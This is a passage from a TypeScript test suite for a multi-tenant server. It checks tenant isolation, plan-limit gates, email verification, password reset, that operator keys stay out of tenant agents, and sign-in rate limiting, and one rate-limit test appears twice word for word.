    return url.searchParams.get("state")!;
  }

  try {
    const before = (await (
      await app.request("/api/github/status", { headers: { authorization: `Bearer ${token}` } })
    ).json()) as { identityLinked: boolean; canLinkIdentity: boolean; connected: boolean };
    assert.equal(before.identityLinked, false, "signing up with a password leaves no GitHub identity");
    assert.equal(before.canLinkIdentity, true, "and GitHub sign in is configured, so one can be attached");

    // Nothing here asks GitHub: without a token there is nobody to ask,
    // and the throwing fetch above proves it.
    const listed = await app.request("/api/github/installations", {
      headers: { authorization: `Bearer ${token}` },
    });
    assert.deepEqual(await listed.json(), []);
    const connect = await jsonPost("/api/github/connect", { installationId: "77" }, token);
    assert.equal(connect.status, 403);
    assert.equal(((await connect.json()) as { code: string }).code, "GITHUB_IDENTITY_MISSING");

    // Following the install through anyway comes back to the console
    // with the reason, rather than to a page of JSON.
    const refused = await app.request(
      `/api/github/callback?installation_id=77&state=${encodeURIComponent(await beginInstall())}`,
      { headers: { authorization: `Bearer ${token}` } },
    );
    assert.equal(refused.status, 302);
    assert.equal(refused.headers.get("location"), "/?github=identity");

    // Connecting a GitHub account is what better-auth's link flow
    // writes: one account row, with a usable token.
    await ctx.db.insert(account).values({
      id: "github-account-linked-after-signup",
      accountId: "54321",
      providerId: "github",
      userId,
      accessToken: "linked-user-token",
    });
    githubReply = () => Response.json({ installations: [{ id: 77, app_id: 4242, account: { login: "acme", type: "Organization" } }] });

    const after = (await (
      await app.request("/api/github/status", { headers: { authorization: `Bearer ${token}` } })
    ).json()) as { identityLinked: boolean };
    assert.equal(after.identityLinked, true);
    const offered = (await (
      await app.request("/api/github/installations", { headers: { authorization: `Bearer ${token}` } })
    ).json()) as { installationId: string }[];
    assert.deepEqual(offered.map((row) => row.installationId), ["77"], "the App's own installations are offered");

    const installed = await app.request(
      `/api/github/callback?installation_id=77&state=${encodeURIComponent(await beginInstall())}`,
      { headers: { authorization: `Bearer ${token}` } },
    );
    assert.equal(installed.status, 302);
    assert.equal(installed.headers.get("location"), "/?github=connected");
    const status = (await (
      await app.request("/api/github/status", { headers: { authorization: `Bearer ${token}` } })
    ).json()) as { connected: boolean };
    assert.equal(status.connected, true, "the same install now binds to the organization");

    // A token GitHub no longer accepts is its own sentence: telling
    // someone to install an App they already installed is what the old
    // silence did.
    githubReply = () => new Response("", { status: 401 });
    const stale = await jsonPost("/api/github/connect", { installationId: "77" }, token);
    assert.equal(stale.status, 403);
    assert.equal(((await stale.json()) as { code: string }).code, "GITHUB_IDENTITY_STALE");
  } finally {
    globalThis.fetch = originalFetch;
    if (originalApp) ctx.githubApp = originalApp;
    else delete ctx.githubApp;
    if (saved.slug === undefined) delete mutableEnv.GITHUB_APP_SLUG;
    else mutableEnv.GITHUB_APP_SLUG = saved.slug;
    if (saved.appId === undefined) delete mutableEnv.GITHUB_APP_ID;
    else mutableEnv.GITHUB_APP_ID = saved.appId;
    if (saved.clientId === undefined) delete mutableEnv.GITHUB_CLIENT_ID;
    else mutableEnv.GITHUB_CLIENT_ID = saved.clientId;
    if (saved.clientSecret === undefined) delete mutableEnv.GITHUB_CLIENT_SECRET;
    else mutableEnv.GITHUB_CLIENT_SECRET = saved.clientSecret;
    if (saved.key === undefined) delete mutableEnv.BENTO_SECRET_KEY;
    else mutableEnv.BENTO_SECRET_KEY = saved.key;
  }
});

/**
 * Machine settings describe the machine a local server runs on. A
 * shared server has no such thing, and must not answer as though it
 * does: the reply would be about the operator's own laptop.
 */
test("machine settings are absent on a shared server", async () => {
  const user = await jsonPost("/api/auth/sign-up/email", {
    email: "settings@bento.test",
    password: "correct-horse-battery",
    name: "Settings",
  });
  const token = user.headers.get("set-auth-token")!;

  const read = await app.request("/api/settings", { headers: { authorization: `Bearer ${token}` } });
  const body = (await read.json()) as { mode: string; shareAgentAuth: boolean; logins: unknown[]; claude?: unknown };
  assert.equal(body.mode, "multi");
  assert.equal(body.shareAgentAuth, false, "an operator's logins are never shared with a tenant");
  assert.deepEqual(body.logins, [], "and the machine's own logins are not even described");
  assert.equal(body.claude, undefined);

  // Nor may a tenant turn sharing on for the machine hosting them.
  const write = await app.request("/api/settings", {
    method: "PATCH",
    headers: { "content-type": "application/json", authorization: `Bearer ${token}` },
    body: JSON.stringify({ shareAgentAuth: true }),
  });
  assert.equal(write.status, 400, "a shared server has no machine settings to change");
});

/**
 * The roster the Mac app reads. These are better-auth's tables in the
 * identity schema, which the row-level security migration does not
 * cover, so this route's own scoping is the only thing between two
 * organizations: worth its own test rather than trust.
 */
test("the team roster does not cross organizations", async () => {
  const insider = await jsonPost("/api/auth/sign-up/email", {
    email: "roster-insider@bento.test",
    password: "correct-horse-battery",
    name: "Insider",
  });
  const insiderToken = insider.headers.get("set-auth-token")!;
  const org = (await (
    await jsonPost("/api/auth/organization/create", { name: "Roster Inc", slug: "roster-inc" }, insiderToken)
  ).json()) as { id: string };
  await jsonPost("/api/auth/organization/set-active", { organizationId: org.id }, insiderToken);
  await jsonPost("/api/auth/organization/invite-member", { email: "pending@bento.test", role: "member" }, insiderToken);

  const asInsider = await (
    await app.request("/api/team/plain", { headers: { authorization: `Bearer ${insiderToken}` } })
  ).text();
  assert.match(asInsider, /^org\|[^|]+\|1\|owner\|Roster Inc$/m, "the active organization is flagged");
  assert.match(asInsider, /^member\|[^|]+\|[^|]+\|owner\|roster-insider@bento\.test\|Insider$/m);
  assert.match(asInsider, /^invitation\|[^|]+\|pending\|member\|pending@bento\.test$/m);

  // An outsider must see their own (empty) roster, never this one.
  const outsider = await jsonPost("/api/auth/sign-up/email", {
    email: "roster-outsider@bento.test",
    password: "correct-horse-battery",
    name: "Outsider",
  });
  const outsiderToken = outsider.headers.get("set-auth-token")!;
  const asOutsider = await (
    await app.request("/api/team/plain", { headers: { authorization: `Bearer ${outsiderToken}` } })
  ).text();
  assert.equal(asOutsider, "mode|multi", "an outsider sees no organization, member, or invitation");
  assert.doesNotMatch(asOutsider, /Roster Inc|roster-insider/);

  // Pointing a session at an organization you are not in must not
  // answer for it. better-auth refuses the switch, and the route checks
  // membership again rather than trusting the session's answer: a
  // session outlives the membership that made it meaningful.
  await jsonPost("/api/auth/organization/set-active", { organizationId: org.id }, outsiderToken);
  const forged = await (
    await app.request("/api/team/plain", { headers: { authorization: `Bearer ${outsiderToken}` } })
  ).text();
  assert.doesNotMatch(forged, /roster-insider|pending@bento\.test/, "a non-member must not read the roster");
});

/**
 * The plan-limit seam. The open source server has no plans; what it
 * has is ctx.entitlements, asked before an invitation is created and
 * before a card goes live. A stub provider proves both doors consult
 * it and pass its sentence through, without any billing code present.
 */
test("entitlement checks gate invitations and going live", async () => {
  const signup = await jsonPost("/api/auth/sign-up/email", {
    email: "capped@bento.test",
    password: "correct-horse-battery",
    name: "Capped",
  });
  const token = signup.headers.get("set-auth-token")!;
  const org = (await (
    await jsonPost("/api/auth/organization/create", { name: "Capped Team", slug: "capped-team" }, token)
  ).json()) as { id: string };
  await jsonPost("/api/auth/organization/set-active", { organizationId: org.id }, token);
  const project = (await (
    await app.request("/api/projects", {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${token}` },
      body: JSON.stringify({ name: "Capped", localPath: "/tmp" }),
    })
  ).json()) as { id: string };
  const feature = (await (
    await app.request("/api/features", {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${token}` },
      body: JSON.stringify({ projectId: project.id, title: "Sixth card" }),
    })
  ).json()) as { id: string };

  const asked: string[] = [];
  ctx.entitlements = {
    async canAddMember(organizationId) {
      asked.push(`member:${organizationId}`);
      return { reason: "The Free plan includes 3 members. Upgrade under Team to invite more people." };
    },
    async canActivateFeature(organizationId) {
      asked.push(`feature:${organizationId}`);
      return { reason: "The Free plan runs 5 live features at a time." };
    },
  };
  try {
    const invite = await jsonPost(
      "/api/auth/organization/invite-member",
      { email: "fourth@bento.test", role: "member", organizationId: org.id },
      token,
    );
    assert.equal(invite.status, 402);
    assert.match(((await invite.json()) as { error: string }).error, /3 members/);

    const advance = await app.request(`/api/features/${feature.id}/advance`, {
      method: "POST",
      headers: { authorization: `Bearer ${token}` },
    });
    assert.equal(advance.status, 402);
    assert.match(((await advance.json()) as { error: string }).error, /5 live features/);

    assert.deepEqual(asked, [`member:${org.id}`, `feature:${org.id}`], "each door asked exactly once");

    // The refusal must carry a message better-auth clients can read.
    // {error} alone reached the console as "That did not work", which
    // told nobody they had hit a plan limit.
    const inviteAgain = await jsonPost(
      "/api/auth/organization/invite-member",
      { email: "fifth@bento.test", role: "member", organizationId: org.id },
      token,
    );
    const inviteBody = (await inviteAgain.json()) as { message?: string; error?: string };
    assert.match(inviteBody.message ?? "", /3 members/, "the client-readable field carries the reason");

    // Allowed answers pass through: the card advances normally.
    ctx.entitlements = {
      async canAddMember() {
        return null;
      },
      async canActivateFeature() {
        return null;
      },
    };
    const allowed = await app.request(`/api/features/${feature.id}/advance`, {
      method: "POST",
      headers: { authorization: `Bearer ${token}` },
    });
    assert.equal(allowed.status, 200);
  } finally {
    delete ctx.entitlements;
  }
});

/**
 * The compute door.
 *
 * Going live is not the only moment a plan can run out: a card that
 * was already moving reaches its next stage later, and the team may
 * have spent everything in between. startRunIfIdle is where every
 * door that starts a run already converges, so it is the one place
 * this can be asked without the next door somebody adds forgetting.
 */
test("a run is refused when the plan has no compute left", async () => {
  const signup = await jsonPost("/api/auth/sign-up/email", {
    email: "spent@bento.test",
    password: "correct-horse-battery",
    name: "Spent",
  });
  const token = signup.headers.get("set-auth-token")!;
  const org = (await (
    await jsonPost("/api/auth/organization/create", { name: "Spent Team", slug: "spent-team" }, token)
  ).json()) as { id: string };
  await jsonPost("/api/auth/organization/set-active", { organizationId: org.id }, token);
  const project = (await (
    await app.request("/api/projects", {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${token}` },
      body: JSON.stringify({ name: "Spent", localPath: "/tmp" }),
    })
  ).json()) as { id: string };
  const feature = (await (
    await app.request("/api/features", {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${token}` },
      body: JSON.stringify({ projectId: project.id, title: "Nothing left" }),
    })
  ).json()) as { id: string };

  // A card in the backlog has no stage to run on, so it goes live
  // first. That transition is the other door's business; this test is
  // about what happens at the next one.
  const live = await app.request(`/api/features/${feature.id}/advance`, {
    method: "POST",
    headers: { authorization: `Bearer ${token}` },
  });
  assert.equal(live.status, 200);

  // Going live handed the card to the first stage's agent, so a run is
  // already working it. "Busy" is the more specific answer and would
  // win, which would test the wrong door: the card is settled first so
  // the only reason left to refuse is the plan.
  await ctx.db.update(agentRuns).set({ status: "cancelled" }).where(eq(agentRuns.featureId, feature.id));

  const asked: string[] = [];
  ctx.entitlements = {
    async canAddMember() {
      return null;
    },
    // Going live is allowed: this team has cards to spare, it has
    // hours it does not have.
    async canActivateFeature() {
      return null;
    },
    async canStartRun(organizationId) {
      asked.push(organizationId);
      return { reason: "The Free plan includes 5 agent hours a month and this team has used them.", code: "PLAN_LIMIT" };
    },
  };
  try {
    const started = await app.request(`/api/features/${feature.id}/quick-run`, {
      method: "POST",
      headers: { authorization: `Bearer ${token}` },
    });
    // 402 rather than 409: nothing is busy, and there is something the
    // team can do about it that waiting will not fix.
    assert.equal(started.status, 402);
    const body = (await started.json()) as { error: string; code?: string };
    assert.match(body.error, /5 agent hours/);
    assert.equal(body.code, "PLAN_LIMIT", "the console needs to tell a member from an admin");
    assert.deepEqual(asked, [org.id], "the door asked about this team, once");
  } finally {
    delete ctx.entitlements;
  }
});

/**
 * Seats are billed per person, so a deployment that charges for them
 * has to hear when the headcount moves. better-auth owns every route
 * that moves it, and an invitation holds a seat from the moment it is
 * created rather than from the moment it is accepted.
 */
test("membership changes are announced to the deployment", async () => {
  const signup = await jsonPost("/api/auth/sign-up/email", {
    email: "seats@bento.test",
    password: "correct-horse-battery",
    name: "Seats",
  });
  const token = signup.headers.get("set-auth-token")!;
  const org = (await (
    await jsonPost("/api/auth/organization/create", { name: "Seat Team", slug: "seat-team" }, token)
  ).json()) as { id: string };
  await jsonPost("/api/auth/organization/set-active", { organizationId: org.id }, token);

  const announced: string[] = [];
  ctx.entitlements = {
    async canAddMember() {
      return null;
    },
    async canActivateFeature() {
      return null;
    },
    async onMembershipChanged(organizationId) {
      announced.push(organizationId);
    },
  };
  try {
    const invite = await jsonPost(
      "/api/auth/organization/invite-member",
      { email: "seatholder@bento.test", role: "member", organizationId: org.id },
      token,
    );
    assert.equal(invite.status, 200);
    const invitation = (await invite.json()) as { id: string };

    // The announcement is fire and forget, so it lands just after the
    // response rather than before it.
    await new Promise((resolve) => setTimeout(resolve, 50));
    assert.deepEqual(announced, [org.id], "creating an invitation holds a seat");

    // Withdrawing it releases the seat, and the organization is found
    // from the invitation itself: cancelling deletes the row that says
    // which team it belonged to, so it has to be read first.
    announced.length = 0;
    const cancelled = await jsonPost(
      "/api/auth/organization/cancel-invitation",
      { invitationId: invitation.id },
      token,
    );
    assert.equal(cancelled.status, 200);
    await new Promise((resolve) => setTimeout(resolve, 50));
    assert.deepEqual(announced, [org.id], "withdrawing an invitation releases the seat");

    // A route that changes nothing about the headcount says nothing.
    announced.length = 0;
    await app.request("/api/auth/organization/list", { headers: { authorization: `Bearer ${token}` } });
    await new Promise((resolve) => setTimeout(resolve, 50));
    assert.deepEqual(announced, [], "reads are not membership changes");
  } finally {
    delete ctx.entitlements;
  }
});

/**
 * The plan check must never be aimed at a tenant the caller is not in.
 * Reading the organization straight from the body let anyone learn
 * another team's plan tier and headcount from the refusal sentence.
 */
test("the invite plan check ignores an organization the caller is not in", async () => {
  const victim = await jsonPost("/api/auth/sign-up/email", {
    email: "victim@bento.test",
    password: "correct-horse-battery",
    name: "Victim",
  });
  const victimToken = victim.headers.get("set-auth-token")!;
  const victimOrg = (await (
    await jsonPost("/api/auth/organization/create", { name: "Victim Inc", slug: "victim-inc" }, victimToken)
  ).json()) as { id: string };

  const mallory = await jsonPost("/api/auth/sign-up/email", {
    email: "mallory@bento.test",
    password: "correct-horse-battery",
    name: "Mallory",
  });
  const malloryToken = mallory.headers.get("set-auth-token")!;

  const asked: string[] = [];
  ctx.entitlements = {
    async canAddMember(organizationId) {
      asked.push(organizationId);
      return { reason: "The Free plan includes 3 members, and this team is at 3." };
    },
    async canActivateFeature() {
      return null;
    },
  };
  try {
    const probe = await jsonPost(
      "/api/auth/organization/invite-member",
      { email: "someone@bento.test", role: "member", organizationId: victimOrg.id },
      malloryToken,
    );
    assert.notEqual(probe.status, 402, "a non-member must not receive the plan refusal");
    const body = await probe.text();
    assert.doesNotMatch(body, /Free plan/, "nor the sentence describing another team's plan");
    assert.deepEqual(asked, [], "the limit check never runs for an organization the caller is not in");
  } finally {
    delete ctx.entitlements;
  }
});

/** Self-hosted multi mode without the cloud module: same absence. */
test("no billing surface exists on a self-hosted multi install", async () => {
  // Signed in, so the answer is about the route rather than the session:
  // an anonymous probe is refused at the door with 401 either way.
  const signIn = await jsonPost("/api/auth/sign-in/email", {
    email: "owner@bento.test",
    password: "correct-horse-battery",
  });
  const token = signIn.headers.get("set-auth-token")!;
  const res = await app.request("/api/billing/plan", { headers: { authorization: `Bearer ${token}` } });
  assert.equal(res.status, 404);
});

/**
 * The address has to be real before the account works.
 *
 * The gate follows SMTP by default, and this suite has none, so it is
 * turned on explicitly here: a deployment that can send mail must not
 * hand out sessions to unconfirmed addresses, and one that cannot send
 * mail must not lock everyone out. Both halves are worth pinning.
 */
test("email verification gates sign in when the deployment can send mail", async () => {
  const gatedEnv = loadEnv({
    BENTO_MODE: "multi",
    DATABASE_URL: testUrl,
    BENTO_DATA_DIR: "/tmp",
    BENTO_SANDBOX_DRIVER: "local-process",
    BETTER_AUTH_SECRET: "test-secret-that-is-long-enough-for-hmac",
    BETTER_AUTH_URL: "http://localhost:4400",
    BENTO_REQUIRE_EMAIL_VERIFICATION: "true",
  } as NodeJS.ProcessEnv);
  const sent: { to: string; subject: string; text: string }[] = [];
  const gatedAuth = createAuth(gatedEnv, ctx.db, {
    description: "test",
    async send(message) {
      sent.push(message);
    },
  });
  assert.ok(gatedAuth);
  const gatedApp = createApp({ ...ctx, env: gatedEnv, auth: gatedAuth });

  const signUp = await gatedApp.request("/api/auth/sign-up/email", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ email: "unverified@bento.test", password: "correct-horse-battery", name: "Unverified" }),
  });
  assert.equal(signUp.status, 200);
  assert.equal(signUp.headers.get("set-auth-token"), null, "an unconfirmed account gets no session");
  assert.equal(sent.length, 1, "and does get an email");
  assert.match(sent[0]!.subject, /Confirm your email/);
  assert.match(sent[0]!.text, /verify-email\?token=/, "carrying the link that confirms it");

  const signIn = await gatedApp.request("/api/auth/sign-in/email", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ email: "unverified@bento.test", password: "correct-horse-battery" }),
  });
  assert.equal(signIn.status, 403, "signing in is refused until the address is confirmed");

  // Opening the link finishes the job.
  const link = /(?<url>http[^\s]*verify-email\?token=[^\s]+)/.exec(sent[0]!.text)?.groups?.url;
  assert.ok(link, "the email carries a usable link");
  const verify = await gatedApp.request(new URL(link).pathname + new URL(link).search);
  assert.ok(verify.status < 400, `verification answered ${verify.status}`);

  const after = await gatedApp.request("/api/auth/sign-in/email", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ email: "unverified@bento.test", password: "correct-horse-battery" }),
  });
  assert.equal(after.status, 200, "and then sign in works");
});

/** The reset email carries a token that actually changes the password. */
test("a forgotten password can be reset from the emailed link", async () => {
  const sent: { to: string; subject: string; text: string }[] = [];
  const resetAuth = createAuth(ctx.env, ctx.db, {
    description: "test",
    async send(message) {
      sent.push(message);
    },
  });
  assert.ok(resetAuth);
  const resetApp = createApp({ ...ctx, auth: resetAuth });

  await resetApp.request("/api/auth/sign-up/email", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ email: "forgetful@bento.test", password: "correct-horse-battery", name: "Forgetful" }),
  });
  sent.length = 0;

  const asked = await resetApp.request("/api/auth/request-password-reset", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ email: "forgetful@bento.test", redirectTo: "/reset-password" }),
  });
  assert.equal(asked.status, 200);
  assert.equal(sent.length, 1);
  assert.match(sent[0]!.subject, /Reset your Bento password/);
  // better-auth puts the token in the path and redirects the browser to
  // the callback with it as a query parameter, so accept either shape.
  const token =
    /reset-password\/([^\s?]+)/.exec(sent[0]!.text)?.[1] ?? /token=([^\s&]+)/.exec(sent[0]!.text)?.[1];
  assert.ok(token, `the email carries a token: ${sent[0]!.text}`);

  const reset = await resetApp.request("/api/auth/reset-password", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ newPassword: "a-brand-new-password", token }),
  });
  assert.equal(reset.status, 200);

  const withNew = await resetApp.request("/api/auth/sign-in/email", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ email: "forgetful@bento.test", password: "a-brand-new-password" }),
  });
  assert.equal(withNew.status, 200, "the new password works");
  const withOld = await resetApp.request("/api/auth/sign-in/email", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ email: "forgetful@bento.test", password: "correct-horse-battery" }),
  });
  assert.notEqual(withOld.status, 200, "and the old one does not");
});

/**
 * Deleting an organization takes its work with it, and tells the
 * deployment first so a subscription can be cancelled. A tenant's rows
 * outliving its organization would be data nobody can reach or delete.
 */
test("deleting an organization removes its projects and notifies the deployment", async () => {
  const told: string[] = [];
  const hookedAuth = createAuth(ctx.env, ctx.db, {
    description: "test",
    async send() {},
  }, { onOrganizationDeleted: async (id) => void told.push(id) });
  assert.ok(hookedAuth);
  const hookedApp = createApp({ ...ctx, auth: hookedAuth });

  const signUp = await hookedApp.request("/api/auth/sign-up/email", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ email: "leaving@bento.test", password: "correct-horse-battery", name: "Leaving" }),
  });
  const token = signUp.headers.get("set-auth-token")!;
  const auth = { authorization: `Bearer ${token}`, "content-type": "application/json" };
  const org = (await (
    await hookedApp.request("/api/auth/organization/create", {
      method: "POST",
      headers: auth,
      body: JSON.stringify({ name: "Leaving Co", slug: "leaving-co" }),
    })
  ).json()) as { id: string };
  await hookedApp.request("/api/auth/organization/set-active", {
    method: "POST",
    headers: auth,
    body: JSON.stringify({ organizationId: org.id }),
  });
  const project = (await (
    await hookedApp.request("/api/projects", {
      method: "POST",
      headers: auth,
      body: JSON.stringify({ name: "Doomed", localPath: "/tmp" }),
    })
  ).json()) as { id: string };

  const deleted = await hookedApp.request("/api/auth/organization/delete", {
    method: "POST",
    headers: auth,
    body: JSON.stringify({ organizationId: org.id }),
  });
  assert.equal(deleted.status, 200);
  assert.deepEqual(told, [org.id], "the deployment hears about it before the rows go");

  const [orphan] = await ctx.db.select().from(projects).where(eq(projects.id, project.id));
  assert.equal(orphan, undefined, "the organization's projects go with it");
});

/**
 * An owner cannot delete their account while they still own a team:
 * that would leave the organization without anyone who can manage it.
 * A member can still request the confirmation email.
 */
test("an owner cannot delete their account while they still own an organization", async () => {
  const sent: string[] = [];
  const hookedAuth = createAuth(ctx.env, ctx.db, {
    description: "test",
    async send(message) {
      sent.push(message.subject);
    },
  });
  assert.ok(hookedAuth);
  const hookedApp = createApp({ ...ctx, auth: hookedAuth });

  const ownerSignUp = await hookedApp.request("/api/auth/sign-up/email", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      email: "owner-stay@bento.test",
      password: "correct-horse-battery",
      name: "Owner Stay",
    }),
  });
  const ownerToken = ownerSignUp.headers.get("set-auth-token")!;
  const ownerAuth = { authorization: `Bearer ${ownerToken}`, "content-type": "application/json" };

  const org = (await (
    await hookedApp.request("/api/auth/organization/create", {
      method: "POST",
      headers: ownerAuth,
      body: JSON.stringify({ name: "Stay Co", slug: "stay-co" }),
    })
  ).json()) as { id: string };
  await hookedApp.request("/api/auth/organization/set-active", {
    method: "POST",
    headers: ownerAuth,
    body: JSON.stringify({ organizationId: org.id }),
  });

  const ownerDelete = await hookedApp.request("/api/auth/delete-user", {
    method: "POST",
    headers: ownerAuth,
    body: JSON.stringify({ callbackURL: "/" }),
  });
  assert.equal(ownerDelete.status, 400, "owning a team blocks account deletion");
  const ownerBody = (await ownerDelete.json()) as { message?: string; error?: { message?: string } | string };
  const ownerMessage =
    ownerBody.message ??
    (typeof ownerBody.error === "string" ? ownerBody.error : ownerBody.error?.message) ??
    JSON.stringify(ownerBody);
  assert.match(ownerMessage, /Stay Co/);
  assert.equal(
    sent.filter((subject) => subject.includes("deleting your Bento account")).length,
    0,
    "no deletion mail for an owner",
  );

  const [ownerUser] = await ctx.db.select({ id: user.id }).from(user).where(eq(user.email, "owner-stay@bento.test"));
  assert.ok(ownerUser);
  const ownerTokens = await ctx.db.select().from(verification).where(eq(verification.value, ownerUser.id));
  assert.equal(
    ownerTokens.filter((row) => row.identifier.startsWith("delete-account-")).length,
    0,
    "no deletion token is stored for an owner",
  );

  const memberSignUp = await hookedApp.request("/api/auth/sign-up/email", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      email: "member-leave@bento.test",
      password: "correct-horse-battery",
      name: "Member Leave",
    }),
  });
  const memberToken = memberSignUp.headers.get("set-auth-token")!;
  const invite = (await (
    await hookedApp.request("/api/auth/organization/invite-member", {
      method: "POST",
      headers: ownerAuth,
      body: JSON.stringify({
        email: "member-leave@bento.test",
        role: "member",
        organizationId: org.id,
      }),
    })
  ).json()) as { id: string };
  await hookedApp.request("/api/auth/organization/accept-invitation", {
    method: "POST",
    headers: { authorization: `Bearer ${memberToken}`, "content-type": "application/json" },
    body: JSON.stringify({ invitationId: invite.id }),
  });

  sent.length = 0;
  const memberDelete = await hookedApp.request("/api/auth/delete-user", {
    method: "POST",
    headers: { authorization: `Bearer ${memberToken}`, "content-type": "application/json" },
    body: JSON.stringify({ callbackURL: "/" }),
  });
  assert.equal(memberDelete.status, 200, "a member may request the confirmation mail");
  const memberBody = (await memberDelete.json()) as { success?: boolean; message?: string };
  assert.equal(memberBody.message, "Verification email sent");

  const [memberUser] = await ctx.db
    .select({ id: user.id })
    .from(user)
    .where(eq(user.email, "member-leave@bento.test"));
  assert.ok(memberUser);
  const memberTokens = await ctx.db.select().from(verification).where(eq(verification.value, memberUser.id));
  assert.ok(
    memberTokens.some((row) => row.identifier.startsWith("delete-account-")),
    "a confirmation token is stored for a member",
  );

  // The mail is sent after the 200, as a background task.
  const deadline = Date.now() + 5_000;
  while (Date.now() < deadline && !sent.includes("Confirm deleting your Bento account")) {
    await new Promise((resolve) => setTimeout(resolve, 25));
  }
  assert.ok(
    sent.includes("Confirm deleting your Bento account"),
    `a member is emailed the confirmation link, got ${JSON.stringify(sent)}`,
  );
});

/**
 * Bring your own key, structurally.
 *
 * A tenant's agents run on that tenant's credentials and nothing else:
 * the operator's environment must never reach a sandbox, because an
 * agent can read anything its sandbox can and one prompt injection
 * would take the key for every customer at once. Asserted here rather
 * than trusted, with the operator's environment deliberately full.
 */
test("an operator's own keys never reach a tenant's agents", async () => {
  const previous = process.env.ANTHROPIC_API_KEY;
  process.env.ANTHROPIC_API_KEY = "sk-ant-operator-key-that-must-not-leak";
  try {
    const resolved = await resolveAgentEnv(ctx, "some-organization", {
      requiredEnv: ["ANTHROPIC_API_KEY"],
    });
    assert.equal(resolved.env.ANTHROPIC_API_KEY, undefined, "the operator's key is not offered");
    assert.deepEqual(resolved.missing, ["ANTHROPIC_API_KEY"], "and the run is told the tenant has none");

    // The machine's own agent logins are equally out of bounds.
    assert.equal(await shouldShareAgentAuth(ctx), false);
    assert.deepEqual(await agentAuthEnv(ctx, { cli: "claude-code", authAlternatives: ["CLAUDE_CODE_OAUTH_TOKEN"] }), {});
  } finally {
    if (previous === undefined) delete process.env.ANTHROPIC_API_KEY;
    else process.env.ANTHROPIC_API_KEY = previous;
  }
});

/**
 * The network lockdown is opt in, owner or admin only, and refuses to
 * pretend: a deployment with nowhere safe to run agents says so rather
 * than storing a setting that would never be honoured.
 */
test("network lockdown is refused when the deployment cannot honour it", async () => {
  const signup = await jsonPost("/api/auth/sign-up/email", {
    email: "locked@bento.test",
    password: "correct-horse-battery",
    name: "Locked",
  });
  const token = signup.headers.get("set-auth-token")!;
  const org = (await (
    await jsonPost("/api/auth/organization/create", { name: "Locked Co", slug: "locked-co" }, token)
  ).json()) as { id: string };
  await jsonPost("/api/auth/organization/set-active", { organizationId: org.id }, token);

  const before = await (
    await app.request("/api/team/policy", { headers: { authorization: `Bearer ${token}` } })
  ).json() as { restrictNetwork: boolean; canEdit: boolean; supported: boolean };
  assert.equal(before.restrictNetwork, false, "open by default");
  assert.equal(before.canEdit, true, "the owner may change it");
  assert.equal(before.supported, false, "this test driver has no restricted network");

  const refused = await app.request("/api/team/policy", {
    method: "PATCH",
    headers: { "content-type": "application/json", authorization: `Bearer ${token}` },
    body: JSON.stringify({ restrictNetwork: true }),
  });
  assert.equal(refused.status, 409, "turning it on without a network to use is refused");
  assert.match(((await refused.json()) as { error: string }).error, /BENTO_SANDBOX_RESTRICTED_NETWORK/);
});

/**
 * Guessing a password has to get expensive fast. The limit is stored
 * in Postgres rather than memory so it holds across instances, which
 * is the only version of this that means anything behind a load
 * balancer.
 */
test("repeated sign in attempts are rate limited", async () => {
  const limited = loadEnv({
    BENTO_MODE: "multi",
    DATABASE_URL: testUrl,
    BENTO_DATA_DIR: "/tmp",
    BENTO_SANDBOX_DRIVER: "local-process",
    BETTER_AUTH_SECRET: "test-secret-that-is-long-enough-for-hmac",
    BETTER_AUTH_URL: "http://localhost:4400",
    BENTO_RATE_LIMIT: "true",
  } as NodeJS.ProcessEnv);
  const limitedAuth = createAuth(limited, ctx.db, { description: "test", async send() {} });
  assert.ok(limitedAuth);
  const limitedApp = createApp({ ...ctx, env: limited, auth: limitedAuth });

  const attempt = () =>
    limitedApp.request("/api/auth/sign-in/email", {
      method: "POST",
      headers: { "content-type": "application/json", "x-forwarded-for": "203.0.113.7" },
      body: JSON.stringify({ email: "owner@bento.test", password: "wrong-password-entirely" }),
    });

  const statuses: number[] = [];
  for (let i = 0; i < 14; i++) statuses.push((await attempt()).status);
  assert.ok(statuses.includes(429), `expected a 429 among ${statuses.join(", ")}`);
  assert.ok(
    statuses.filter((status) => status === 429).length >= 2,
    "and the door stays shut once it closes",
  );
});

/**
 * Guessing a password has to get expensive fast. The limit is stored
 * in Postgres rather than memory so it holds across instances, which
 * is the only version of this that means anything behind a load
 * balancer.
 */
test("repeated sign in attempts are rate limited", async () => {
  const limited = loadEnv({
    BENTO_MODE: "multi",
    DATABASE_URL: testUrl,
    BENTO_DATA_DIR: "/tmp",
    BENTO_SANDBOX_DRIVER: "local-process",
    BETTER_AUTH_SECRET: "test-secret-that-is-long-enough-for-hmac",
    BETTER_AUTH_URL: "http://localhost:4400",
    BENTO_RATE_LIMIT: "true",
  } as NodeJS.ProcessEnv);
  const limitedAuth = createAuth(limited, ctx.db, { description: "test", async send() {} });
  assert.ok(limitedAuth);
  const limitedApp = createApp({ ...ctx, env: limited, auth: limitedAuth });

  const attempt = () =>
    limitedApp.request("/api/auth/sign-in/email", {
      method: "POST",
      headers: { "content-type": "application/json", "x-forwarded-for": "203.0.113.7" },
      body: JSON.stringify({ email: "owner@bento.test", password: "wrong-password-entirely" }),
    });

  const statuses: number[] = [];
  for (let i = 0; i < 14; i++) statuses.push((await attempt()).status);
  assert.ok(statuses.includes(429), `expected a 429 among ${statuses.join(", ")}`);
  assert.ok(
    statuses.filter((status) => status === 429).length >= 2,
    "and the door stays shut once it closes",
  );
});



/**
 * Every sign in lands in the user's organization.
 *
